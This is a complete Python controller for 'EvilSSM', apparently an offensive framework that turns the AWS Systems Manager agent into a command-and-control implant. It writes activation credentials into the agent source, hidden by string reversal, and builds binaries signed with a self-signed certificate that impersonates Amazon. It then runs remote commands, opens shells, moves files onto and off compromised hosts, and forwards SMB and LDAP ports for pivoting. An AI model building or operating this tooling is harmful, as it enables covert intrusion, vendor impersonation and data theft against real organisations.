#!/usr/bin/env python3
import argparse
import os
import random
import secrets
import shutil
import subprocess
import signal
import json
import sys
import tempfile
import time
import re
import base64

AGENT_PARSER_PATH = "core/agent_parser.go"
TRANSFER_RAW_CHUNK = 16 * 1024
# Upload splits one continuous Base64 stream, so use the largest 4-character
# boundary that represents no more than TRANSFER_RAW_CHUNK raw bytes.
UPLOAD_CHUNK_SIZE = (TRANSFER_RAW_CHUNK // 3) * 4
DOWNLOAD_RAW_CHUNK = TRANSFER_RAW_CHUNK
DEFAULT_UPLOAD_WAIT_TIMEOUT = 600.0
UPLOAD_POLL_INTERVAL = 1.0
UPLOAD_STATUS_REPORT_INTERVAL = 10.0
UPLOAD_NON_TERMINAL_STATUSES = frozenset(('Pending', 'InProgress', 'Delayed'))
DEFAULT_SIGN_SUBJECT = "/C=US/ST=Washington/L=Seattle/O=Amazon.com Services LLC/OU=AWS Systems Manager/CN=Amazon.com Services LLC/serialNumber=3482342"


def reverse_string(s):
    return s[::-1]


def cmd_bake(args):
    with open(AGENT_PARSER_PATH, 'r') as f:
        content = f.read()

    # Find the two credential lines after flag.Parse() -- supports reversed and plaintext forms.
    baked_value_pattern = r'(?:reverseString\("[^"]*"\)|"[^"]*")'
    cred_pattern = rf'(\tactivationID = ){baked_value_pattern}'
    code_pattern = rf'(\tactivationCode = ){baked_value_pattern}'

    if not re.search(cred_pattern, content) or not re.search(code_pattern, content):
        print("Could not find credential placeholders in agent_parser.go", file=sys.stderr)
        sys.exit(1)

    if args.plaintext:
        content = re.sub(cred_pattern, f'\\1"{args.activation_id}"', content, count=1)
        content = re.sub(code_pattern, f'\\1"{args.activation_code}"', content, count=1)
        # Comment out reverseString function
        content = re.sub(
            r'(func reverseString\(s string\) string \{.*?\treturn string\(runes\)\n\})',
            lambda m: '\n'.join('// ' + line for line in m.group(0).split('\n')),
            content, flags=re.DOTALL)
    else:
        encoded_id = reverse_string(args.activation_id)
        encoded_code = reverse_string(args.activation_code)
        content = re.sub(cred_pattern, f'\\1reverseString("{encoded_id}")', content, count=1)
        content = re.sub(code_pattern, f'\\1reverseString("{encoded_code}")', content, count=1)
        # Uncomment reverseString function if commented out, or re-insert if missing entirely
        if '// func reverseString(' in content:
            content = re.sub(
                r'(// func reverseString\(s string\).*?// \})',
                lambda m: '\n'.join(line[3:] if line.startswith('// ') else line for line in m.group(0).split('\n')),
                content, flags=re.DOTALL)
        elif 'func reverseString(' not in content:
            reverse_func = (
                'func reverseString(s string) string {\n'
                '\trunes := []rune(s)\n'
                '\tfor i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {\n'
                '\t\trunes[i], runes[j] = runes[j], runes[i]\n'
                '\t}\n'
                '\treturn string(runes)\n'
                '}\n\n'
            )
            content = content.replace('func parseFlags() {', reverse_func + 'func parseFlags() {')

    if args.region:
        content = re.sub(
            r'region = "([^"]*)"',
            f'region = "{args.region}"',
            content,
            count=1
        )

    with open(AGENT_PARSER_PATH, 'w') as f:
        f.write(content)

    print(f"Baked into {AGENT_PARSER_PATH}:")
    if args.plaintext:
        print(f"  ActivationID:   {args.activation_id} (plaintext)")
        print(f"  ActivationCode: {args.activation_code} (plaintext)")
    else:
        print(f"  ActivationID:   {args.activation_id} -> reversed: {encoded_id}")
        print(f"  ActivationCode: {args.activation_code} -> reversed: {encoded_code}")
    if args.region:
        print(f"  Region:         {args.region}")


BUILD_TARGETS = {
    ('linux', 'amd64'): ('build-linux', 'bin/linux_amd64/amazon-ssm-agent'),
    ('linux', '386'): ('build-linux-386', 'bin/linux_386/amazon-ssm-agent'),
    ('linux', 'arm'): ('build-arm', 'bin/linux_arm/amazon-ssm-agent'),
    ('linux', 'arm64'): ('build-arm64', 'bin/linux_arm64/amazon-ssm-agent'),
    ('windows', 'amd64'): ('build-windows', 'bin/windows_amd64/amazon-ssm-agent.exe'),
    ('windows', '386'): ('build-windows-386', 'bin/windows_386/amazon-ssm-agent.exe'),
}


def build_jobs(target, arch):
    platforms = ['linux', 'windows'] if target == 'all' else [target]
    jobs = []
    for platform in platforms:
        key = (platform, arch)
        if key not in BUILD_TARGETS:
            raise ValueError(f"unsupported compile target: {platform}/{arch}")
        jobs.append((platform, *BUILD_TARGETS[key]))
    return jobs


def run_command(cmd, env=None):
    print(f"[*] {' '.join(cmd)}")
    result = subprocess.run(cmd, env=env)
    if result.returncode != 0:
        sys.exit(result.returncode)


def generate_self_signed_pfx(args):
    openssl = shutil.which('openssl')
    if not openssl:
        print("openssl not found. Install it first, e.g. sudo apt install openssl", file=sys.stderr)
        sys.exit(1)

    tmp = tempfile.TemporaryDirectory(prefix='evilssm-sign-')
    key_path = os.path.join(tmp.name, 'cert.key')
    cert_path = os.path.join(tmp.name, 'cert.pem')
    pfx_path = os.path.join(tmp.name, 'cert.pfx')
    password = secrets.token_hex(12)
    serial = '0x' + secrets.token_hex(16)
    days = random.SystemRandom().randint(330, 420)

    req_cmd = [
        openssl, 'req',
        '-newkey', 'rsa:4096',
        '-nodes',
        '-x509',
        '-sha256',
        '-days', str(days),
        '-set_serial', serial,
        '-subj', args.cert_subject,
        '-addext', 'keyUsage=digitalSignature',
        '-addext', 'extendedKeyUsage=codeSigning',
        '-keyout', key_path,
        '-out', cert_path,
    ]
    result = subprocess.run(req_cmd, capture_output=True, text=True)
    if result.returncode != 0:
        tmp.cleanup()
        print(f"openssl certificate generation failed:\n{result.stderr.strip()}", file=sys.stderr)
        sys.exit(result.returncode)

    pfx_cmd = [
        openssl, 'pkcs12',
        '-export',
        '-out', pfx_path,
        '-inkey', key_path,
        '-in', cert_path,
        '-passout', 'pass:' + password,
    ]
    result = subprocess.run(pfx_cmd, capture_output=True, text=True)
    if result.returncode != 0:
        tmp.cleanup()
        print(f"openssl PFX export failed:\n{result.stderr.strip()}", file=sys.stderr)
        sys.exit(result.returncode)

    print(f"[*] Generated temporary self-signed signing cert ({serial}, {days} days)")
    return tmp, pfx_path, password


def sign_authenticode(path, args):
    osslsigncode = shutil.which('osslsigncode')
    if not osslsigncode:
        print("osslsigncode not found. Install it first, e.g. sudo apt install osslsigncode", file=sys.stderr)
        sys.exit(1)

    temp_cert = None
    if args.pfx:
        if not os.path.isfile(args.pfx):
            print(f"PFX not found: {args.pfx}", file=sys.stderr)
            sys.exit(1)
        password = args.pfx_pass or os.environ.get(args.pfx_pass_env)
        if password is None:
            print(f"--pfx requires --pfx-pass or ${args.pfx_pass_env}", file=sys.stderr)
            sys.exit(1)
        pfx_path = args.pfx
    else:
        temp_cert, pfx_path, password = generate_self_signed_pfx(args)

    signed_path = path + ".signed"
    try:
        base_cmd = [
            osslsigncode, 'sign',
            '-pkcs12', pfx_path,
            '-pass', password,
            '-h', 'sha256',
            '-n', args.sign_name,
            '-i', args.sign_url,
        ]
        if args.timestamp:
            base_cmd.extend(['-ts', args.timestamp])
        base_cmd.extend([
            '-in', path,
            '-out', signed_path,
        ])

        result = subprocess.run(base_cmd, capture_output=True, text=True)
        if result.returncode != 0 and args.timestamp:
            if os.path.exists(signed_path):
                os.remove(signed_path)
            print("[!] timestamp signing failed, retrying without timestamp", file=sys.stderr)
            fallback_cmd = [
                osslsigncode, 'sign',
                '-pkcs12', pfx_path,
                '-pass', password,
                '-h', 'sha256',
                '-n', args.sign_name,
                '-i', args.sign_url,
                '-in', path,
                '-out', signed_path,
            ]
            result = subprocess.run(fallback_cmd, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"osslsigncode failed:\n{result.stderr.strip()}", file=sys.stderr)
            sys.exit(result.returncode)

        os.replace(signed_path, path)
        print(f"[*] Authenticode signed: {path}")
    finally:
        if temp_cert:
            temp_cert.cleanup()


def cmd_compile(args):
    try:
        jobs = build_jobs(args.target, args.arch)
    except ValueError as err:
        print(err, file=sys.stderr)
        sys.exit(1)

    if args.sign and any(platform == 'windows' for platform, _, _ in jobs):
        if not shutil.which('osslsigncode'):
            print("osslsigncode not found. Install it first, e.g. sudo apt install osslsigncode", file=sys.stderr)
            sys.exit(1)
        if args.pfx and not os.path.isfile(args.pfx):
            print(f"PFX not found: {args.pfx}", file=sys.stderr)
            sys.exit(1)
        if args.pfx and args.pfx_pass is None and os.environ.get(args.pfx_pass_env) is None:
            print(f"--pfx requires --pfx-pass or ${args.pfx_pass_env}", file=sys.stderr)
            sys.exit(1)
        if not args.pfx and not shutil.which('openssl'):
            print("openssl not found. Install it first, e.g. sudo apt install openssl", file=sys.stderr)
            sys.exit(1)

    env = os.environ.copy()
    env['CGO_ENABLED'] = '0'

    for platform, make_target, output_path in jobs:
        run_command(['make', make_target], env=env)
        if args.sign and platform == 'windows':
            sign_authenticode(output_path, args)

    print("[*] Compile complete")


def cmd_runcmd(args):
    result = subprocess.run([
        'aws', 'ssm', 'send-command',
        '--document-name', args.document,
        '--parameters', f'commands=["{args.command}"]',
        '--instance-ids', args.instance,
        '--region', args.region,
        '--output', 'json'
    ], capture_output=True, text=True)

    if result.returncode != 0 or not result.stdout.strip():
        print(f"send-command failed:\n{result.stderr.strip()}", file=sys.stderr)
        sys.exit(1)

    command_id = json.loads(result.stdout)['Command']['CommandId']

    while True:
        result = subprocess.run([
            'aws', 'ssm', 'get-command-invocation',
            '--command-id', command_id,
            '--instance-id', args.instance,
            '--region', args.region,
            '--output', 'json'
        ], capture_output=True, text=True)

        if result.returncode != 0 or not result.stdout.strip():
            time.sleep(1)
            continue

        invocation = json.loads(result.stdout)
        if invocation['Status'] != 'InProgress':
            break
        time.sleep(0.5)

    print(invocation['StandardOutputContent'])
    if invocation['StandardErrorContent']:
        print(invocation['StandardErrorContent'], file=sys.stderr)


processes = []

def portfwd_cleanup(signum=None, frame=None):
    print("\n[*] Cleaning up SSM sessions...")
    for p, port in processes:
        p.terminate()
        print(f"    Terminated port {port}")
    for p, _ in processes:
        p.wait()
    print("[*] All sessions closed.")
    sys.exit(0)

def cmd_portfwd(args):
    ports = [p.strip() for p in args.ports.split(',')]

    signal.signal(signal.SIGINT, portfwd_cleanup)
    signal.signal(signal.SIGTERM, portfwd_cleanup)

    print(f"[*] Starting port forwards through {args.instance} to {args.target}")

    for port in ports:
        local_port = str(int(port) + args.local_offset)
        cmd = [
            'aws', 'ssm', 'start-session',
            '--target', args.instance,
            '--region', args.region,
            '--document-name', 'AWS-StartPortForwardingSessionToRemoteHost',
            '--parameters', f'{{"host":["{args.target}"],"portNumber":["{port}"],"localPortNumber":["{local_port}"]}}'
        ]
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        processes.append((p, port))
        print(f"    localhost:{local_port} -> {args.target}:{port}")

    print(f"\n[*] {len(ports)} sessions active. Press Ctrl+C to stop.\n")

    while True:
        for p, port in processes:
            if p.poll() is not None:
                print(f"[!] Session for port {port} died unexpectedly")
        signal.pause()


def cmd_list(args):
    result = subprocess.run([
        'aws', 'ssm', 'describe-instance-information',
        '--region', args.region,
        '--output', 'json'
    ], capture_output=True, text=True)

    if result.returncode != 0:
        print(f"describe-instance-information failed:\n{result.stderr.strip()}", file=sys.stderr)
        sys.exit(1)

    instances = json.loads(result.stdout).get('InstanceInformationList', [])
    if not args.all:
        instances = [i for i in instances if i.get('PingStatus') == 'Online']
    if not instances:
        print("No managed nodes found.")
        return

    rows = []
    for i in instances:
        rows.append([
            i.get('InstanceId', ''),
            i.get('PingStatus', ''),
            i.get('Name', ''),
            i.get('PlatformName', ''),
        ])

    widths = [max(len(r[c]) for r in rows) for c in range(4)]
    headers = ['NodeID', 'Status', 'Name', 'Platform']
    widths = [max(widths[c], len(headers[c])) for c in range(4)]
    fmt = '  '.join(f'{{:<{w}}}' for w in widths)

    print(fmt.format(*headers))
    print(fmt.format(*['-' * w for w in widths]))
    for r in rows:
        print(fmt.format(*r))


def _invocation_diagnostic(command_id, invocation):
    parts = [f"command_id={command_id}"]
    status = invocation.get('Status')
    status_details = invocation.get('StatusDetails')
    response_code = invocation.get('ResponseCode')
    execution_elapsed = invocation.get('ExecutionElapsedTime')

    if status:
        parts.append(f"status={status}")
    if status_details and status_details != status:
        parts.append(f"status_details={status_details}")
    if response_code is not None:
        parts.append(f"response_code={response_code}")
    if execution_elapsed:
        parts.append(f"execution_elapsed={execution_elapsed}")
    return ', '.join(parts)


def _append_diagnostic(message, diagnostic):
    message = message.strip()
    return f"{message}\n{diagnostic}" if message else diagnostic


def report_upload_failure(context, stdout, stderr, status):
    print(f"[!] {context} failed (status: {status})", file=sys.stderr)
    if stderr:
        print(f"    {stderr.replace(chr(10), chr(10) + '    ')}", file=sys.stderr)
    if stdout:
        print("    Standard output:", file=sys.stderr)
        print(f"    {stdout.replace(chr(10), chr(10) + '    ')}", file=sys.stderr)


def send_ssm_command(instance, command, document, region):
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        json.dump({'commands': [command]}, f)
        params_file = f.name

    try:
        result = subprocess.run([
            'aws', 'ssm', 'send-command',
            '--document-name', document,
            '--parameters', f'file://{params_file}',
            '--instance-ids', instance,
            '--region', region,
            '--output', 'json'
        ], capture_output=True, text=True)
    finally:
        os.unlink(params_file)

    if result.returncode != 0 or not result.stdout.strip():
        return '', result.stderr.strip(), 'Failed'

    command_id = json.loads(result.stdout)['Command']['CommandId']

    while True:
        result = subprocess.run([
            'aws', 'ssm', 'get-command-invocation',
            '--command-id', command_id,
            '--instance-id', instance,
            '--region', region,
            '--output', 'json'
        ], capture_output=True, text=True)

        if result.returncode != 0 or not result.stdout.strip():
            time.sleep(1)
            continue

        invocation = json.loads(result.stdout)
        if invocation['Status'] not in ('InProgress', 'Pending', 'Delayed'):
            break
        time.sleep(1)

    return (
        invocation.get('StandardOutputContent', ''),
        invocation.get('StandardErrorContent', ''),
        invocation.get('Status', 'Unknown')
    )


def send_upload_ssm_command(instance, command, document, region,
                            wait_timeout=DEFAULT_UPLOAD_WAIT_TIMEOUT):
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        json.dump({'commands': [command]}, f)
        params_file = f.name

    try:
        result = subprocess.run([
            'aws', 'ssm', 'send-command',
            '--document-name', document,
            '--parameters', f'file://{params_file}',
            '--instance-ids', instance,
            '--region', region,
            '--output', 'json'
        ], capture_output=True, text=True)
    finally:
        os.unlink(params_file)

    if result.returncode != 0 or not result.stdout.strip():
        error = result.stderr.strip() or 'send-command returned no output'
        return '', error, 'SendFailed'

    try:
        command_id = json.loads(result.stdout)['Command']['CommandId']
    except (json.JSONDecodeError, KeyError, TypeError) as err:
        return '', f"Could not read command ID from send-command response: {err}", 'SendFailed'

    started_at = time.monotonic()
    last_report_at = started_at
    last_invocation = None
    last_poll_error = ''

    while time.monotonic() - started_at < wait_timeout:
        result = subprocess.run([
            'aws', 'ssm', 'get-command-invocation',
            '--command-id', command_id,
            '--instance-id', instance,
            '--region', region,
            '--output', 'json'
        ], capture_output=True, text=True)

        if result.returncode != 0 or not result.stdout.strip():
            last_poll_error = result.stderr.strip() or 'get-command-invocation returned no output'
            now = time.monotonic()
            if now - last_report_at >= UPLOAD_STATUS_REPORT_INTERVAL:
                elapsed = int(now - started_at)
                print(f"[*] SSM command {command_id}: waiting for invocation "
                      f"({elapsed}s elapsed)", file=sys.stderr)
                last_report_at = now
            time.sleep(UPLOAD_POLL_INTERVAL)
            continue

        try:
            invocation = json.loads(result.stdout)
        except json.JSONDecodeError as err:
            last_poll_error = f"get-command-invocation returned invalid JSON: {err}"
            time.sleep(UPLOAD_POLL_INTERVAL)
            continue

        last_invocation = invocation
        status = invocation.get('Status', 'Unknown')
        stdout = invocation.get('StandardOutputContent', '')
        stderr = invocation.get('StandardErrorContent', '')

        if status not in UPLOAD_NON_TERMINAL_STATUSES:
            if status != 'Success':
                stderr = _append_diagnostic(
                    stderr,
                    f"SSM invocation ended: {_invocation_diagnostic(command_id, invocation)}",
                )
            return stdout, stderr, status

        now = time.monotonic()
        if now - last_report_at >= UPLOAD_STATUS_REPORT_INTERVAL:
            elapsed = int(now - started_at)
            print(f"[*] SSM command {command_id}: still {status} "
                  f"({elapsed}s elapsed)", file=sys.stderr)
            last_report_at = now
        time.sleep(UPLOAD_POLL_INTERVAL)

    if last_invocation is None:
        stdout = ''
        stderr = (f"Timed out after {wait_timeout:g}s waiting for SSM invocation; "
                  f"command_id={command_id}, last_poll_error={last_poll_error or 'none'}")
    else:
        stdout = last_invocation.get('StandardOutputContent', '')
        stderr = last_invocation.get('StandardErrorContent', '')
        diagnostic = (f"Timed out after {wait_timeout:g}s waiting for SSM command; "
                      f"{_invocation_diagnostic(command_id, last_invocation)}")
        if last_poll_error:
            diagnostic += f", last_poll_error={last_poll_error}"
        stderr = _append_diagnostic(stderr, diagnostic)
    return stdout, stderr, 'WaitTimedOut'


def get_instance_platform(instance, region):
    result = subprocess.run([
        'aws', 'ssm', 'describe-instance-information',
        '--region', region,
        '--filters', f'Key=InstanceIds,Values={instance}',
        '--output', 'json',
    ], capture_output=True, text=True)
    if result.returncode != 0:
        return None
    instances = json.loads(result.stdout).get('InstanceInformationList', [])
    if not instances:
        return None
    return instances[0].get('PlatformType', 'Linux')


def update_transfer_progress(current, total, action):
    end = '\n' if current == total else ''
    print(f"\r    [{current}/{total}] {action}", end=end, flush=True)


def cmd_upload(args):
    if not os.path.isfile(args.local_file):
        print(f"File not found: {args.local_file}", file=sys.stderr)
        sys.exit(1)

    with open(args.local_file, 'rb') as f:
        raw = f.read()

    b64 = base64.b64encode(raw).decode('ascii')
    file_size = len(raw)

    platform = get_instance_platform(args.instance, args.region)
    if platform is None:
        print(f"Could not determine platform for {args.instance}", file=sys.stderr)
        sys.exit(1)

    is_windows = platform == 'Windows'
    document = 'AWS-RunPowerShellScript' if is_windows else 'AWS-RunShellScript'
    temp_b64 = (f'C:\\Windows\\Temp\\ssmu_{secrets.token_hex(4)}.b64' if is_windows
                else f'/dev/shm/.ssmu_{secrets.token_hex(4)}.b64')

    chunks = [b64[i:i + UPLOAD_CHUNK_SIZE] for i in range(0, len(b64), UPLOAD_CHUNK_SIZE)]

    print(f"[*] Uploading {args.local_file} ({file_size} bytes) -> {args.remote_path}")
    print(f"[*] Platform: {platform} | Chunks: {len(chunks)} | Decode: {args.decode_method if is_windows else 'base64'}")

    for idx, chunk in enumerate(chunks):
        if is_windows:
            cmd = f"[IO.File]::AppendAllText('{temp_b64}', '{chunk}')"
        else:
            cmd = f"printf '%s' '{chunk}' >> '{temp_b64}'"

        stdout, stderr, status = send_upload_ssm_command(
            args.instance, cmd, document, args.region, args.wait_timeout)
        if status != 'Success':
            if idx:
                print()
            report_upload_failure(f"Chunk {idx + 1}/{len(chunks)}", stdout, stderr, status)
            sys.exit(1)
        update_transfer_progress(idx + 1, len(chunks), 'sent')

    if is_windows:
        if args.decode_method == 'certutil':
            decode_cmd = f"certutil -decode '{temp_b64}' '{args.remote_path}'"
        else:
            decode_cmd = f"[IO.File]::WriteAllBytes('{args.remote_path}', [Convert]::FromBase64String((Get-Content '{temp_b64}' -Raw)))"
    else:
        decode_cmd = f"base64 -d '{temp_b64}' > '{args.remote_path}'"

    stdout, stderr, status = send_upload_ssm_command(
        args.instance, decode_cmd, document, args.region, args.wait_timeout)
    if status != 'Success':
        report_upload_failure('Decode', stdout, stderr, status)
        sys.exit(1)

    cleanup_cmd = f"Remove-Item '{temp_b64}' -Force" if is_windows else f"rm -f '{temp_b64}'"
    send_upload_ssm_command(args.instance, cleanup_cmd, document, args.region, args.wait_timeout)

    verify_cmd = f"(Get-Item '{args.remote_path}').Length" if is_windows else f"stat -c%s '{args.remote_path}'"
    stdout, stderr, status = send_upload_ssm_command(
        args.instance, verify_cmd, document, args.region, args.wait_timeout)
    remote_size = stdout.strip() if status == 'Success' else '?'

    print(f"[*] Upload complete: {args.remote_path} ({remote_size} bytes)")
    if str(file_size) != remote_size:
        print(f"[!] Size mismatch! Local: {file_size}, Remote: {remote_size}", file=sys.stderr)


def cmd_download(args):
    platform = get_instance_platform(args.instance, args.region)
    if platform is None:
        print(f"Could not determine platform for {args.instance}", file=sys.stderr)
        sys.exit(1)

    is_windows = platform == 'Windows'
    document = 'AWS-RunPowerShellScript' if is_windows else 'AWS-RunShellScript'

    size_cmd = f"(Get-Item '{args.remote_path}').Length" if is_windows else f"stat -c%s '{args.remote_path}'"
    stdout, stderr, status = send_ssm_command(args.instance, size_cmd, document, args.region)
    if status != 'Success':
        print(f"[!] Could not stat remote file: {stderr}", file=sys.stderr)
        sys.exit(1)

    file_size = int(stdout.strip())
    if file_size == 0:
        open(args.local_file, 'wb').close()
        print(f"[*] Download complete: {args.local_file} (0 bytes)")
        return

    num_chunks = (file_size + DOWNLOAD_RAW_CHUNK - 1) // DOWNLOAD_RAW_CHUNK

    print(f"[*] Downloading {args.remote_path} ({file_size} bytes) -> {args.local_file}")
    print(f"[*] Platform: {platform} | Chunks: {num_chunks}")

    b64_parts = []
    for idx in range(num_chunks):
        offset = idx * DOWNLOAD_RAW_CHUNK
        length = min(DOWNLOAD_RAW_CHUNK, file_size - offset)

        if is_windows:
            cmd = (f"$f=[IO.File]::OpenRead('{args.remote_path}');"
                   f"$f.Seek({offset},'Begin')|Out-Null;"
                   f"$buf=New-Object byte[] {length};"
                   f"$r=$f.Read($buf,0,{length});"
                   f"$f.Close();"
                   f"[Convert]::ToBase64String($buf,0,$r)")
        else:
            cmd = f"dd if='{args.remote_path}' bs=1 skip={offset} count={length} 2>/dev/null | base64 -w0"

        stdout, stderr, status = send_ssm_command(args.instance, cmd, document, args.region)
        if status != 'Success':
            if idx:
                print()
            print(f"[!] Chunk {idx + 1}/{num_chunks} failed: {stderr}", file=sys.stderr)
            sys.exit(1)

        b64_parts.append(stdout.strip())
        update_transfer_progress(idx + 1, num_chunks, 'received')

    raw = base64.b64decode(''.join(b64_parts))
    with open(args.local_file, 'wb') as f:
        f.write(raw)

    print(f"[*] Download complete: {args.local_file} ({len(raw)} bytes)")
    if len(raw) != file_size:
        print(f"[!] Size mismatch! Remote: {file_size}, Local: {len(raw)}", file=sys.stderr)


def cmd_deregister(args):
    if not args.confirm:
        answer = input(f"Deregister and remove {args.instance}? [y/N] ").strip().lower()
        if answer != 'y':
            print("Aborted.")
            return

    result = subprocess.run([
        'aws', 'ssm', 'deregister-managed-instance',
        '--instance-id', args.instance,
        '--region', args.region,
    ], capture_output=True, text=True)

    if result.returncode != 0:
        print(f"deregister failed:\n{result.stderr.strip()}", file=sys.stderr)
        sys.exit(1)

    print(f"Deregistered {args.instance}")

    result = subprocess.run([
        'aws', 'ssm', 'describe-instance-information',
        '--region', args.region,
        '--filters', f'Key=InstanceIds,Values={args.instance}',
        '--output', 'json',
    ], capture_output=True, text=True)

    if result.returncode == 0:
        instances = json.loads(result.stdout).get('InstanceInformationList', [])
        if not instances:
            print(f"Confirmed: {args.instance} removed from SSM")
        else:
            print(f"Warning: {args.instance} still appears in SSM (may take a moment to propagate)")


def cmd_shell(args):
    os.execvp('aws', [
        'aws', 'ssm', 'start-session',
        '--target', args.instance,
        '--region', args.region,
    ])


def main():
    parser = argparse.ArgumentParser(description='EvilSSM Controller')
    sub = parser.add_subparsers(dest='command', required=True)

    # list
    ls = sub.add_parser('list', help='List SSM managed nodes')
    ls.add_argument('-a', '--all', action='store_true', help='Show all nodes (default: online only)')
    ls.add_argument('-r', '--region', default='ap-northeast-2', help='AWS region')
    ls.set_defaults(func=cmd_list)

    # deregister
    dereg = sub.add_parser('deregister', help='Deregister and remove a managed instance')
    dereg.add_argument('instance', help='Instance ID (e.g., mi-0123456789)')
    dereg.add_argument('--confirm', action='store_true', help='Skip confirmation prompt')
    dereg.add_argument('-r', '--region', default='ap-northeast-2', help='AWS region')
    dereg.set_defaults(func=cmd_deregister)

    # shell
    sh = sub.add_parser('shell', help='Interactive shell on a managed instance')
    sh.add_argument('instance', help='Instance ID')
    sh.add_argument('-r', '--region', default='ap-northeast-2', help='AWS region')
    sh.set_defaults(func=cmd_shell)

    # upload
    up = sub.add_parser('upload', help='Upload a file to a managed instance')
    up.add_argument('instance', help='Instance ID')
    up.add_argument('local_file', help='Local file path')
    up.add_argument('remote_path', help='Remote file path')
    up.add_argument('--decode-method', choices=['powershell', 'certutil'], default='powershell',
                    help='Windows decode method (default: powershell)')
    up.add_argument('--wait-timeout', type=float, default=DEFAULT_UPLOAD_WAIT_TIMEOUT,
                    help='Seconds to wait for each SSM command (default: 600)')
    up.add_argument('-r', '--region', default='ap-northeast-2', help='AWS region')
    up.set_defaults(func=cmd_upload)

    # download
    dl = sub.add_parser('download', help='Download a file from a managed instance')
    dl.add_argument('instance', help='Instance ID')
    dl.add_argument('remote_path', help='Remote file path')
    dl.add_argument('local_file', help='Local file path')
    dl.add_argument('-r', '--region', default='ap-northeast-2', help='AWS region')
    dl.set_defaults(func=cmd_download)

    # bake
    bake = sub.add_parser('bake', help='Bake activation credentials into agent_parser.go')
    bake.add_argument('activation_id', help='SSM Activation ID')
    bake.add_argument('activation_code', help='SSM Activation Code')
    bake.add_argument('-r', '--region', help='AWS region (default: ap-northeast-2)')
    bake.add_argument('--plaintext', action='store_true', help='Store credentials in plaintext (no string reversal)')
    bake.set_defaults(func=cmd_bake)

    # compile
    comp = sub.add_parser('compile', help='Compile EvilSSM binaries')
    comp.add_argument('target', nargs='?', default='all', choices=['linux', 'windows', 'all'],
                      help='Build target (default: all)')
    comp.add_argument('--arch', default='amd64', choices=['amd64', '386', 'arm', 'arm64'],
                      help='Architecture (default: amd64)')
    comp.add_argument('--sign', action='store_true',
                      help='Authenticode-sign Windows output; auto-generates a temporary self-signed cert by default')
    comp.add_argument('--pfx', help='Optional PFX/PKCS#12 signing certificate')
    comp.add_argument('--pfx-pass', dest='pfx_pass', help='Optional PFX password')
    comp.add_argument('--pfx-pass-env', default='EVILSSM_PFX_PASS',
                      help='Environment variable containing optional PFX password')
    comp.add_argument('--timestamp', default='http://timestamp.digicert.com',
                      help='RFC3161 timestamp URL; use empty string to disable')
    comp.add_argument('--sign-name', default='Amazon SSM Agent',
                      help='osslsigncode description')
    comp.add_argument('--sign-url', default='https://aws.amazon.com/systems-manager/',
                      help='osslsigncode URL')
    comp.add_argument('--cert-subject', default=DEFAULT_SIGN_SUBJECT,
                      help='self-signed certificate subject used when --pfx is omitted')
    comp.set_defaults(func=cmd_compile)

    # runcmd
    run = sub.add_parser('runcmd', help='Run a command on a managed instance')
    run.add_argument('instance', help='Instance ID (e.g., mi-0123456789)')
    run.add_argument('command', help='Command to execute')
    run.add_argument('-d', '--document', default='AWS-RunShellScript',
                     choices=['AWS-RunShellScript', 'AWS-RunPowerShellScript'],
                     help='SSM document (default: AWS-RunShellScript)')
    run.add_argument('-r', '--region', default='ap-northeast-2', help='AWS region')
    run.set_defaults(func=cmd_runcmd)

    # portfwd
    pf = sub.add_parser('portfwd', help='Multi-port forward through SSM')
    pf.add_argument('instance', help='Instance ID')
    pf.add_argument('target', help='Target IP behind the instance')
    pf.add_argument('ports', help='Comma-separated ports (e.g., 135,445,389)')
    pf.add_argument('-l', '--local-offset', type=int, default=0, help='Local port offset')
    pf.add_argument('-r', '--region', default='ap-northeast-2', help='AWS region')
    pf.set_defaults(func=cmd_portfwd)

    args = parser.parse_args()
    args.func(args)


if __name__ == '__main__':
    main()
